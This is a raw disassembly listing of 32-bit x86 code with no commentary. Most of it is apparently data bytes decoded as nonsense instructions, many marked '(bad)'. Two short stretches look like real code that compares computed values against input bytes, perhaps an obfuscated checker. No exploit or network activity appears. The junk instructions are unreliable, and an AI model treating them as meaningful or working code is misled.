  4141b9:	shl    BYTE PTR [edx],1
  4141bb:	icebp  
  4141bc:	arpl   WORD PTR [eax+0x5fa22974],dx
  4141c2:	push   es
  4141c3:	jo     0x41415d
  4141c5:	xchg   edx,eax
  4141c6:	sbb    DWORD PTR [edx],esi
  4141c8:	push   edi
  4141c9:	sub    al,BYTE PTR [esp+ecx*1+0x10]
  4141cd:	iret   
  4141ce:	mov    bh,0x9f
  4141d0:	dec    esi
  4141d1:	push   ss
  4141d2:	push   ss
  4141d3:	inc    edi
  4141d4:	sti    
  4141d5:	pop    edx
  4141d6:	inc    edx
  4141d7:	ja     0x414184
  4141d9:	jne    0x41424a
  4141db:	scas   eax,DWORD PTR es:[edi]
  4141dc:	data16 (bad) 
  4141de:	mov    ds:0xfcfa670,eax
  4141e3:	sub    edx,DWORD PTR [eax+0xe6c9282]
  4141e9:	or     eax,0xd24eeb8a
  4141ee:	mov    dl,0xec
  4141f0:	push   esp
  4141f1:	inc    ecx
  4141f2:	sbb    al,0x81
  4141f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141f5:	add    DWORD PTR [esi+0x5b96d572],edx
  4141fb:	je     0x41418c
  4141fd:	int3   
  4141fe:	ja     0x414272
  414200:	call   0xc7764302
  414205:	ins    BYTE PTR es:[edi],dx
  414206:	xchg   ecx,eax
  414207:	aam    0x5d
  414209:	mov    ds:0x8415bd82,eax
  41420e:	pop    ebp
  41420f:	clc    
  414210:	cmp    edi,eax
  414212:	sti    
  414213:	rol    edx,0x32
  414216:	xor    DWORD PTR [edi+0x5f536c0f],eax
  41421c:	ror    bl,1
  41421e:	xchg   ebx,eax
  41421f:	pop    eax
  414220:	fwait
  414221:	mov    al,ds:0x4b4b884d
  414226:	aaa    
  414227:	cwde   
  414228:	or     bh,bl
  41422a:	jnp    0x4142a6
  41422c:	add    eax,0x1f4aae2e
  414231:	in     al,dx
  414232:	ret    0x579b
  414235:	shl    ebx,1
  414237:	scas   eax,DWORD PTR es:[edi]
  414238:	daa    
  414239:	or     eax,0x95d7659d
  41423e:	inc    ebx
  41423f:	mov    ebp,0x309e7ca4
  414244:	push   edx
  414245:	jle    0x4141fe
  414247:	fs jmp 0x414257
  41424a:	push   ecx
  41424b:	dec    ecx
  41424c:	jle    0x41428a
  41424e:	and    dh,BYTE PTR [ebx+ebp*4]
  414251:	vmwrite ebp,DWORD PTR [edx+edi*1-0x58]
  414256:	mov    esi,DWORD PTR [esi+0x7d]
  414259:	arpl   WORD PTR fs:[eax+0x1],ax
  41425d:	adc    eax,0x18426674
  414262:	pop    ebx
  414263:	cmc    
  414264:	ins    BYTE PTR es:[edi],dx
  414265:	jmp    DWORD PTR [ebx-0x1b]
  414268:	adc    eax,0x3707e51a
  41426d:	and    bh,BYTE PTR [esi]
  41426f:	mov    ds,WORD PTR [esi]
  414271:	lahf   
  414272:	test   BYTE PTR [eax-0x77],al
  414275:	mov    dh,0x10
  414277:	adc    eax,0x9f4713c
  41427c:	xchg   edx,eax
  41427d:	mov    esp,0xe3434bea
  414282:	pop    esi
  414283:	mov    al,0xe1
  414285:	bound  edx,QWORD PTR ds:0x83125a15
  41428b:	retf   0xef6c
  41428e:	int3   
  41428f:	adc    ch,bl
  414291:	mov    cl,al
  414293:	cs or  eax,0xa1cf3e4a
  414299:	in     eax,dx
  41429a:	in     eax,dx
  41429b:	mov    ds:0x3b756f27,al
  4142a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142a1:	mov    ecx,0x616810dd
  4142a6:	fwait
  4142a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142a8:	inc    esi
  4142a9:	js     0x4142a0
  4142ab:	cli    
  4142ac:	jl     0x4142d7
  4142ae:	retf   
  4142af:	stos   DWORD PTR es:[edi],eax
  4142b0:	jmp    FWORD PTR [ebx]
  4142b2:	je     0x414299
  4142b4:	sbb    DWORD PTR [eax],ecx
  4142b6:	enter  0x5f2b,0x9
  4142ba:	adc    eax,0xce666f
  4142bf:	aam    0x34
  4142c1:	loope  0x4142db
  4142c3:	loop   0x41433b
  4142c5:	push   0x21
  4142c7:	stos   BYTE PTR es:[edi],al
  4142c8:	outs   dx,BYTE PTR ds:[esi]
  4142c9:	lods   al,BYTE PTR ds:[esi]
  4142ca:	imul   edx,DWORD PTR [esi+esi*2],0xe1fc1e46
  4142d1:	(bad)  
  4142d2:	pop    esi
  4142d3:	imul   ebx,DWORD PTR [ecx-0x515adfe0],0x3dd4dac3
  4142dd:	jns    0x4142b6
  4142df:	xchg   edi,eax
  4142e0:	jbe    0x414338
  4142e2:	bswap  ebx
  4142e4:	push   esi
  4142e5:	fwait
  4142e6:	and    eax,0xc21e731b
  4142eb:	dec    BYTE PTR [esi-0x75ae246]
  4142f1:	pusha  
  4142f2:	repnz mov ah,0xfd
  4142f5:	(bad)  
  4142f6:	retf   0x2acc
  4142f9:	xor    bh,BYTE PTR [eax+0x3869a7eb]
  4142ff:	(bad)  
  414300:	adc    BYTE PTR [eax+0x7db5d7ee],al
  414306:	or     DWORD PTR [ecx+edi*4],esp
  414309:	out    dx,al
  41430a:	imul   ebx,ebx,0x56
  41430d:	jg     0x414310
  41430f:	pop    ebx
  414310:	es mov eax,0x3273e900
  414316:	loop   0x4142de
  414318:	and    BYTE PTR [ecx+0x29],ch
  41431b:	(bad)  
  41431c:	call   0x81be:0x102b9796
  414323:	ins    BYTE PTR es:[edi],dx
  414324:	xchg   DWORD PTR [eax-0x21],ebx
  414327:	iret   
  414328:	lods   al,BYTE PTR ds:[esi]
  414329:	stos   DWORD PTR es:[edi],eax
  41432a:	in     al,dx
  41432b:	fbld   TBYTE PTR [eax]
  41432d:	stc    
  41432e:	loopne 0x41430c
  414330:	cmp    esp,edx
  414332:	ds mov al,0xb9
  414335:	das    
  414336:	push   ss
  414337:	(bad)  
  414338:	and    cl,BYTE PTR [edx+ebp*1]
  41433b:	pop    esi
  41433c:	int    0xb9
  41433e:	or     al,0x20
  414340:	xlat   BYTE PTR ds:[ebx]
  414341:	dec    ecx
  414342:	cmp    al,0x76
  414344:	inc    ebp
  414345:	out    0x35,al
  414347:	test   BYTE PTR [eax+0x1ffe460f],bl
  41434d:	add    BYTE PTR [ecx+0x5b],dl
  414350:	adc    ebp,ebx
  414352:	or     ebx,DWORD PTR ds:0x7b251562
  414358:	cs int3 
  41435a:	test   al,0x86
  41435c:	xor    eax,0x3fbf73b9
  414361:	cli    
  414362:	jmp    0x414395
  414364:	stc    
  414365:	inc    edi
  414366:	and    eax,0xfb1086c1
  41436b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41436c:	add    BYTE PTR [edx-0xc],ah
  41436f:	mov    dh,0xeb
  414371:	xchg   esp,eax
  414372:	rcl    dh,cl
  414374:	adc    eax,0x812bb8b0
  414379:	mov    al,0xab
  41437b:	jl     0x4143a4
  41437d:	inc    ebp
  41437e:	sub    BYTE PTR [esi],cl
  414380:	pop    edx
  414381:	sbb    al,0xa3
  414383:	adc    BYTE PTR [edx+0x529b050b],ch
  414389:	xlat   BYTE PTR ds:[ebx]
  41438a:	pop    es
  41438b:	aaa    
  41438c:	scas   eax,DWORD PTR es:[edi]
  41438d:	into   
  41438e:	jle    0x414397
  414390:	(bad)  
  414391:	loope  0x4143ea
  414393:	cmp    BYTE PTR [edx],0x48
  414396:	jo     0x414325
  414398:	sub    dh,bh
  41439a:	mov    ds:0xc4a7ff0f,al
  41439f:	mov    cl,0xab
  4143a1:	pop    ebx
  4143a2:	mov    bl,0x5a
  4143a4:	(bad)  
  4143a5:	mov    dh,0x3e
  4143a7:	rcr    BYTE PTR [ebx],1
  4143a9:	pop    esi
  4143aa:	inc    edx
  4143ab:	mov    al,ds:0xa97c5aab
  4143b0:	loop   0x414378
  4143b2:	pop    edx
  4143b3:	in     al,0x45
  4143b5:	lods   al,BYTE PTR ds:[esi]
  4143b6:	int3   
  4143b7:	pop    ds
  4143b8:	xchg   BYTE PTR [edi],cl
  4143ba:	adc    eax,esp
  4143bc:	push   ebp
  4143bd:	stos   BYTE PTR es:[edi],al
  4143be:	leave  
  4143bf:	stc    
  4143c0:	aas    
  4143c1:	xlat   BYTE PTR ds:[ebx]
  4143c2:	ss and al,0x61
  4143c5:	or     al,0x1c
  4143c7:	jo     0x41435a
  4143c9:	test   al,ch
  4143cb:	add    dh,BYTE PTR [edx+0x4a]
  4143ce:	ins    DWORD PTR es:[edi],dx
  4143cf:	ds and al,0xbf
  4143d2:	les    ebp,FWORD PTR ds:0x3f8b9a9
  4143d8:	adc    al,0x36
  4143da:	mov    edi,0xc3ad7b3e
  4143df:	pop    edx
  4143e0:	dec    edi
  4143e1:	nop
  4143e2:	or     DWORD PTR [edi+0x62],esi
  4143e5:	and    esi,esi
  4143e7:	jmp    0x4143d6
  4143e9:	jnp    0x414391
  4143eb:	add    BYTE PTR [esi],ch
  4143ed:	cmp    dl,BYTE PTR [edi-0x49]
  4143f0:	retf   
  4143f1:	das    
  4143f2:	icebp  
  4143f3:	add    esi,edx
  4143f5:	jle    0x41440d
  4143f7:	or     dl,BYTE PTR [esi]
  4143f9:	mov    eax,ds:0xf47b2492
  4143fe:	stc    
  4143ff:	ss cmp edi,esi
  414402:	dec    ecx
  414403:	dec    edx
  414404:	test   BYTE PTR [edi-0x558505ef],0xf9
  41440b:	jmp    0xb5f25297
  414410:	or     bl,BYTE PTR [esi-0x1ad6b3f]
  414416:	pop    ss
  414417:	pop    eax
  414418:	icebp  
  414419:	mov    BYTE PTR [eax-0x3],bh
  41441c:	enter  0x2afa,0xf2
  414420:	lods   al,BYTE PTR ds:[esi]
  414421:	fmul   st,st(4)
  414423:	lds    esi,FWORD PTR [ecx+0x5a]
  414426:	add    al,0x5d
  414428:	xor    al,0xd4
  41442a:	add    dl,BYTE PTR [esi+0x5618b847]
  414430:	dec    eax
  414431:	inc    eax
  414432:	arpl   WORD PTR [esi-0x74693e83],sp
  414438:	out    0x99,al
  41443a:	add    BYTE PTR [esi+0x72],0xd7
  41443e:	inc    ebp
  41443f:	imul   ebx,DWORD PTR [ebx-0x7f539e70],0xffffffae
  414446:	cmp    edi,esi
  414448:	stc    
  414449:	jge    0x4144a0
  41444b:	pop    edi
  41444c:	jecxz  0x4143e3
  41444e:	sbb    al,ah
  414450:	push   0x10
  414452:	xchg   ebp,eax
  414453:	push   esi
  414454:	fstp   TBYTE PTR [ecx-0x5847d208]
  41445a:	mov    ebx,0xafd8063
  41445f:	call   0xab4f:0x1bd5b5d1
  414466:	sbb    edi,DWORD PTR [edx]
  414468:	out    0xda,eax
  41446a:	and    cl,ah
  41446c:	and    bh,dl
  41446e:	jb     0x414444
  414470:	dec    ebx
  414471:	push   0x14
  414473:	add    al,0x71
  414475:	pop    ebx
  414476:	dec    edx
  414477:	inc    ecx
  414478:	jp     0x4144e9
  41447a:	je     0x414444
  41447c:	ss aaa 
  41447e:	fadd   DWORD PTR [ecx+0x590f8547]
  414484:	daa    
  414485:	jno    0x4144fc
  414487:	sub    bl,BYTE PTR [eax-0x10baa603]
  41448d:	dec    ebx
  41448e:	adc    BYTE PTR [ebp+0x57],dl
  414491:	jb     0x4144df
  414493:	pop    ss
  414494:	cmp    al,0xc2
  414496:	add    DWORD PTR [esi],ebp
  414498:	or     cl,BYTE PTR [edx+0x430615d]
  41449e:	dec    eax
  41449f:	(bad)  
  4144a0:	cmp    eax,0xc67f28e
  4144a5:	dec    edi
  4144a6:	jmp    0xb72f:0x348df298
  4144ad:	adc    edx,DWORD PTR [esi+eax*2]
  4144b0:	mov    cl,0xd9
  4144b2:	jmp    0x4b35:0x21aa9bdd
  4144b9:	daa    
  4144ba:	test   BYTE PTR ds:0x41cb9f60,cl
  4144c0:	loopne 0x414462
  4144c2:	jp     0x4144c0
  4144c4:	jo     0x4144ed
  4144c6:	jo     0x41445c
  4144c8:	push   DWORD PTR [esp+ebx*2+0x5afa1f1d]
  4144cf:	cmp    eax,0x6794cfae
  4144d4:	jl     0x41446a
  4144d6:	scas   al,BYTE PTR es:[edi]
  4144d7:	inc    ebx
  4144d8:	mov    esi,0xb94e2fbc
  4144dd:	and    esp,DWORD PTR [ebx+ecx*1]
  4144e0:	mov    bh,BYTE PTR [ecx+ebp*4]
  4144e3:	mov    ds:0x40814640,al
  4144e8:	gs push eax
  4144ea:	gs mov edi,0x7e1bda49
  4144f0:	jp     0x4144c2
  4144f2:	dec    esp
  4144f3:	mov    ecx,fs
  4144f5:	push   eax
  4144f6:	sahf   
  4144f7:	cmp    ebx,DWORD PTR [ebx-0x5ee5f140]
  4144fd:	xchg   edi,eax
  4144fe:	adc    eax,0x84660f68
  414503:	and    eax,0x54e0011f
  414508:	mov    esi,0x45c7d300
  41450d:	clc    
  41450e:	add    al,0x32
  414510:	add    BYTE PTR [eax],al
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xe47c:0x73623c4c
  414595:	enter  0x7cb3,0xd2
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    BYTE PTR [esi+0x4ce088a1],cl
  4145a5:	adc    eax,0xfb34ee1f
  4145aa:	int    0xf9
  4145ac:	dec    edx
  4145ad:	fdiv   st(7),st
  4145af:	into   
  4145b0:	cmp    al,0x13
  4145b2:	cli    
  4145b3:	adc    al,0xea
  4145b5:	xor    DWORD PTR [edi],ebx
  4145b7:	add    al,0x4e
  4145b9:	pop    ebx
  4145ba:	rcr    al,cl
  4145bc:	sub    al,0x70
  4145be:	retf   0xd864
  4145c1:	or     al,0x9e
  4145c3:	arpl   cx,dx
  4145c5:	mov    DWORD PTR [edi],esp
  4145c7:	jg     0x4145d3
  4145c9:	inc    esp
  4145ca:	xor    dl,bl
  4145cc:	mov    al,ds:0x592d9b5
  4145d1:	adc    al,0x16
  4145d3:	icebp  
  4145d4:	xor    bh,BYTE PTR [ecx+0x2c]
  4145d7:	ja     0x4145fa
  4145d9:	jle    0x414574
  4145db:	or     eax,0x7313e28b
  4145e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145e1:	cmp    al,0xff
  4145e3:	pop    es
  4145e4:	js     0x4145aa
  4145e6:	dec    edi
  4145e7:	mov    ch,0xe8
  4145e9:	dec    ebx
  4145ea:	fsub   DWORD PTR [eax]
  4145ec:	or     ebx,DWORD PTR [esi+ebp*4+0x2f]
  4145f0:	bound  edi,QWORD PTR [esi+0x563f4af7]
  4145f6:	dec    esp
  4145f7:	and    bl,BYTE PTR ds:0x9fb17dcd
  4145fd:	mov    gs,WORD PTR [edx+0x3b2237f1]
  414603:	test   DWORD PTR [edi],0x4da0eb72
  414609:	or     ch,BYTE PTR [ebp*8+0xb0b86b1]
  414610:	aaa    
  414611:	outs   dx,DWORD PTR ds:[esi]
  414612:	nop
  414613:	scas   eax,DWORD PTR es:[edi]
  414614:	adc    dl,dh
  414616:	daa    
  414617:	fnstsw WORD PTR [edi-0x76]
  41461a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41461b:	popa   
  41461c:	lea    esp,[esi+0x333e3887]
  414622:	jmp    0x40ff:0x8b857376
  414629:	jb     0x4145c7
  41462b:	adc    eax,0x483e454a
  414630:	xchg   cl,al
  414632:	xor    DWORD PTR [esi-0x3243ce26],edi
  414638:	mov    DWORD PTR [ebp+0x567b098a],ebx
  41463e:	jmp    0x4145f2
  414640:	jbe    0x4145fe
  414642:	cli    
  414643:	loopne 0x414671
  414645:	aaa    
  414646:	mov    ah,0xf
  414648:	dec    esi
  414649:	jmp    0x22c3:0xe8ab5523
  414650:	or     eax,0x10037398
  414655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414656:	dec    ebx
  414657:	rol    BYTE PTR [ecx+0x32],cl
  41465a:	(bad)
  41465e:	ins    DWORD PTR es:[edi],dx
  41465f:	dec    edi
  414660:	xchg   ebp,eax
  414661:	adc    DWORD PTR [ebp+0x5a],eax
  414664:	cmp    al,0x79
  414666:	add    esi,DWORD PTR [ecx]
  414668:	neg    BYTE PTR [esi]
  41466a:	test   al,al
  41466c:	dec    esi
  41466d:	data16 fadd st(2),st
  414670:	push   0xdf21452
  414675:	sub    DWORD PTR [ecx+0x6af0b2d4],ebx
  41467b:	ss adc ebx,ebx
  41467e:	call   0x72b2ae1e
  414683:	iret   
  414684:	push   eax
  414685:	adc    BYTE PTR [ecx],ch
  414687:	cdq    
  414688:	daa    
  414689:	popf   
  41468a:	cmp    al,0x6
  41468c:	sub    BYTE PTR ds:0x73519618,ah
  414692:	sub    cl,bl
  414694:	aad    0x98
  414696:	add    edi,edx
  414698:	pop    esi
  414699:	cmp    al,0x7b
  41469b:	sbb    eax,eax
  41469d:	(bad)  
  41469e:	jmp    0xeb329f3a
  4146a3:	push   ecx
  4146a4:	hlt    
  4146a5:	mov    ch,0x7d
  4146a7:	sub    dl,BYTE PTR [edx-0x6e7ab394]
  4146ad:	aas    
  4146ae:	xor    al,cl
  4146b0:	xlat   BYTE PTR ds:[ebx]
  4146b1:	or     al,0xfb
  4146b3:	(bad)  
  4146b4:	retf   0x519a
  4146b7:	sbb    esp,DWORD PTR [ebp-0x53]
  4146ba:	cmp    al,0x4
  4146bc:	repz popf 
  4146be:	dec    edi
  4146bf:	xchg   edx,eax
  4146c0:	sub    dh,al
  4146c2:	xor    eax,0x85fd6aa3
  4146c7:	icebp  
  4146c8:	sub    eax,0xba3eabb9
  4146cd:	mov    bl,0x12
  4146cf:	fwait
  4146d0:	jmp    0x4146e4
  4146d2:	test   edi,ebx
  4146d4:	pop    ss
  4146d5:	adc    dl,BYTE PTR [edx+0x66700ad9]
  4146db:	ss mov al,0xf3
  4146de:	fidivr DWORD PTR [esi]
  4146e0:	sub    eax,0x3a50763a
  4146e5:	mov    gs,ecx
  4146e7:	fisub  DWORD PTR [ecx+0x707d8903]
  4146ed:	pop    esp
  4146ee:	mov    ebp,0xffa927ff
  4146f3:	shl    BYTE PTR [esi-0x9b7e7d],1
  4146f9:	sbb    al,0x6b
  4146fb:	mov    ebp,0x43f633a4
  414700:	icebp  
  414701:	sub    al,0x15
  414703:	retf   0xd674
  414706:	dec    edi
  414707:	mov    BYTE PTR [eax],ch
  414709:	jg     0x41470a
  41470b:	dec    ebx
  41470c:	xchg   ecx,eax
  41470d:	es fwait
  41470f:	push   edx
  414710:	iret   
  414711:	sbb    DWORD PTR [edx],ebp
  414713:	inc    esi
  414714:	mov    bl,0xfd
  414716:	push   ebp
  414717:	aas    
  414718:	stos   DWORD PTR es:[edi],eax
  414719:	test   dl,cl
  41471b:	xchg   DWORD PTR [eax-0x14],esi
  41471e:	jo     0x41474b
  414720:	rol    DWORD PTR [edi],0xd
  414723:	ss xor eax,0x91a1a529
  414729:	push   0x86a152ff
  41472e:	lds    esp,FWORD PTR [edi]
  414730:	xchg   esp,eax
  414731:	mov    cl,0x78
  414733:	rcr    DWORD PTR [ebp+0x38],cl
  414736:	dec    ecx
  414737:	shr    edx,cl
  414739:	das    
  41473a:	test   DWORD PTR [ebp+ebp*2+0x65],0xad40b2d
  414742:	and    al,0xc1
  414744:	add    edx,DWORD PTR [ecx]
  414746:	mov    edx,0x47c5c3be
  41474b:	das    
  41474c:	mov    cl,0x83
  41474e:	retf   
  41474f:	lods   al,BYTE PTR ds:[esi]
  414750:	xchg   esi,eax
  414751:	pop    ebp
  414752:	out    dx,al
  414753:	retf   
  414754:	push   ebp
  414755:	xchg   ebx,eax
  414756:	scas   al,BYTE PTR es:[edi]
  414757:	or     eax,eax
  414759:	push   esp
  41475a:	xor    ecx,DWORD PTR [edx-0x2189f75f]
  414760:	mov    edi,0xe77cee7f
  414765:	xor    ah,BYTE PTR [ebx-0x5d]
  414768:	das    
  414769:	dec    ebx
  41476a:	popa   
  41476b:	cwde   
  41476c:	xchg   DWORD PTR [eax+0x4a],eax
  41476f:	loop   0x4147d9
  414771:	mov    esi,DWORD PTR [edx-0x6e]
  414774:	shr    edx,0xd5
  414777:	jns    0x4147cd
  414779:	stos   BYTE PTR es:[edi],al
  41477a:	pop    es
  41477b:	call   0xed239c5f
  414780:	ds jmp 0x4147a1
  414783:	punpckhwd mm5,QWORD PTR [ebx]
  414786:	pop    esp
  414787:	mov    dl,0x4
  414789:	mov    ch,0x65
  41478b:	inc    ebx
  41478c:	(bad)  
  41478d:	cmp    al,0x48
  41478f:	pusha  
  414790:	cli    
  414791:	rcr    esp,cl
  414793:	xchg   ebp,eax
  414794:	sbb    BYTE PTR [eax],0x3
  414797:	in     eax,dx
  414798:	int    0x3d
  41479a:	or     BYTE PTR [edi-0x14],0xe1
  41479e:	repnz ss test eax,0x5058cfc8
  4147a5:	div    dh
  4147a7:	fadd   DWORD PTR [esi+0x17be9c2f]
  4147ad:	mov    ch,0x5f
  4147af:	inc    edx
  4147b0:	arpl   WORD PTR [ecx+edx*4-0x4f4ae5b6],bx
  4147b7:	add    BYTE PTR [eax-0x11],0x1f
  4147bb:	ror    edx,cl
  4147bd:	xchg   ebx,eax
  4147be:	mov    edx,0x733af4b7
  4147c3:	and    BYTE PTR [edx+0x34724afc],0x94
  4147ca:	and    dl,bh
  4147cc:	and    eax,0xef565cfb
  4147d1:	sbb    eax,DWORD PTR ds:0xc54a5f7b
  4147d7:	js     0x414802
  4147d9:	sub    BYTE PTR [eax-0x4f],ah
  4147dc:	xchg   esp,eax
  4147dd:	mov    ds:0x43d3fed7,al
  4147e2:	rcl    DWORD PTR [ecx+0x1e],1
  4147e5:	fwait
  4147e6:	push   edx
  4147e7:	xchg   edx,eax
  4147e8:	sti    
  4147e9:	cmc    
  4147ea:	and    DWORD PTR [edx],0x2f
  4147ed:	sub    al,0x1a
  4147ef:	xor    al,0x8e
  4147f1:	sbb    al,0xaa
  4147f3:	sub    DWORD PTR [ecx-0x35],esp
  4147f6:	out    0x41,al
  4147f8:	mov    ?,WORD PTR ds:0x5fdb5096
  4147fe:	mov    bl,ch
  414800:	dec    edx
  414801:	stos   BYTE PTR es:[edi],al
  414802:	ss push eax
  414804:	xchg   ebp,eax
  414805:	fsub   DWORD PTR [edx+0x430315d6]
  41480b:	sbb    ebp,DWORD PTR [ebp+ebp*1+0xc9f5c]
  414812:	jnp    0x41481e
  414814:	retf   0x109c
  414817:	in     al,0xcf
  414819:	mov    ch,BYTE PTR [ebp+ecx*2-0x51]
  41481d:	add    BYTE PTR [ebx+edx*8],0x14
  414821:	sub    edi,DWORD PTR [edx]
  414823:	add    eax,0x804f46e0
  414828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414829:	loope  0x414864
  41482b:	lock cmp DWORD PTR [ebx],0xc4ccc79b
  414832:	mov    al,0xb5
  414834:	mov    ebx,0x648b1bd9
  414839:	push   esi
  41483a:	inc    edx
  41483b:	pusha  
  41483c:	aas    
  41483d:	pusha  
  41483e:	fwait
  41483f:	xor    ah,bh
  414841:	dec    ebp
  414842:	mov    ebx,0x8e24e366
  414847:	push   ecx
  414848:	push   ebp
  414849:	out    0xef,al
  41484b:	(bad)  
  41484c:	loopne 0x414867
  41484e:	hlt    
  41484f:	bsf    esp,DWORD PTR [ebx]
  414852:	hlt    
  414853:	mov    cl,0x4e
  414855:	(bad)  
  414856:	mov    bl,0x1d
  414858:	std    
  414859:	ficom  WORD PTR [edi-0x37]
  41485c:	out    dx,al
  41485d:	fisttp WORD PTR [edi+0x6b]
  414860:	lea    esi,[ecx]
  414862:	sub    ebp,DWORD PTR [eax]
  414864:	push   es
  414865:	dec    esi
  414866:	retf   
  414867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414868:	lock sub esp,ebx
  41486b:	pushf  
  41486c:	in     al,0x47
  41486e:	mov    al,ds:0x7e0406bf
  414873:	out    dx,al
  414874:	sub    ebx,DWORD PTR [esi-0x5a074826]
  41487a:	mov    dh,0xc5
  41487c:	mov    ?,WORD PTR [edx+0x51a20b26]
  414882:	pxor   mm7,mm7
  414885:	fnstsw WORD PTR fs:[ecx-0x66de8733]
  41488c:	call   0x336f:0xe7529086
  414893:	aam    0xf4
  414895:	add    al,BYTE PTR [eax-0x2e1a8837]
  41489b:	in     al,dx
  41489c:	arpl   WORD PTR [edi-0x12bf74d],cx
  4148a2:	pop    ebx
  4148a3:	or     BYTE PTR [esi-0x7cbf96c4],ch
  4148a9:	jg     0x41482e
  4148ab:	adc    eax,0x38294094
  4148b0:	inc    eax
  4148b1:	(bad)  [ecx-0x26313480]
  4148b7:	adc    al,cl
  4148b9:	sar    BYTE PTR [esi-0x37381126],cl
  4148bf:	add    ebp,esi
  4148c1:	dec    esi
  4148c2:	and    al,BYTE PTR [edi]
  4148c4:	pop    ds
  4148c5:	cmp    ah,BYTE PTR ds:0x7d840d5
  4148cb:	adc    DWORD PTR [edi],ecx
  4148cd:	dec    esi
  4148ce:	push   ss
  4148cf:	out    dx,al
  4148d0:	inc    esp
  4148d1:	inc    edx
  4148d2:	in     eax,dx
  4148d3:	cmp    eax,esi
  4148d5:	ficom  DWORD PTR [edi]
  4148d7:	(bad)  
  4148d8:	leave  
  4148d9:	and    ebx,DWORD PTR [ebp+0x5b]
  4148dc:	mov    DWORD PTR [esp+edi*2],eax
  4148df:	nop
  4148e0:	sbb    BYTE PTR ds:0x987bc307,bh
  4148e6:	xor    BYTE PTR [ecx+0x2b],0x5d
  4148ea:	push   edx
  4148eb:	arpl   WORD PTR [ebp-0x3055963c],di
  4148f1:	push   0xffffffd2
  4148f3:	out    0x3b,eax
  4148f5:	or     al,BYTE PTR [esi+0x2c]
  4148f8:	mov    fs,WORD PTR [esi+0x7cdcad4a]
  4148fe:	add    al,0x5d
  414900:	jae    0x41493a
  414902:	cmp    DWORD PTR [ebp+0x26],edx
  414905:	in     eax,0x10
  414907:	js     0x4148df
  414909:	(bad)  
  41490a:	jne    0x414925
  41490c:	xor    BYTE PTR [ebp-0x60],al
  41490f:	fwait
  414910:	pop    es
  414911:	add    al,0x6
  414913:	gs push ebx
  414915:	jb     0x4f1b14e9
  41491b:	repnz xchg edi,eax
  41491d:	imul   ebx,DWORD PTR [edx],0x5c
  414920:	push   edx
  414921:	popf   
  414922:	dec    esp
  414923:	jns    0x4148ae
  414925:	not    DWORD PTR [eax-0x2e]
  414928:	repz sbb BYTE PTR [edi+0x3072a82],0x27
  414930:	(bad)  
  414931:	rol    DWORD PTR [ecx],1
  414933:	nop
  414934:	dec    ebx
  414935:	in     al,dx
  414936:	add    al,BYTE PTR [ecx-0x201b3e0f]
  41493c:	outs   dx,DWORD PTR ds:[esi]
  41493d:	scas   eax,DWORD PTR es:[edi]
  41493e:	xchg   edx,eax
  41493f:	or     al,0x1b
  414941:	mov    ah,0x97
  414943:	imul   ecx,DWORD PTR [esp+eiz*2+0x4a],0x51
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0xffffff87
  414996:	rcr    DWORD PTR [ecx-0x56],cl
  414999:	mov    ebx,DWORD PTR [eax+ebx*1]
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [ecx],cl
  4149a2:	repnz or eax,0xc292b227
  4149a8:	stos   DWORD PTR es:[edi],eax
  4149a9:	ret    
  4149aa:	mov    DWORD PTR [eax+ebx*1+0x60a44995],ebp
  4149b1:	cmp    esp,DWORD PTR [ebp-0xe]
  4149b4:	adc    al,0xd4
  4149b6:	out    dx,al
  4149b7:	(bad)  [ebx+edi*4+0x170f35a8]
  4149be:	nop
  4149bf:	dec    eax
  4149c0:	out    0xbe,al
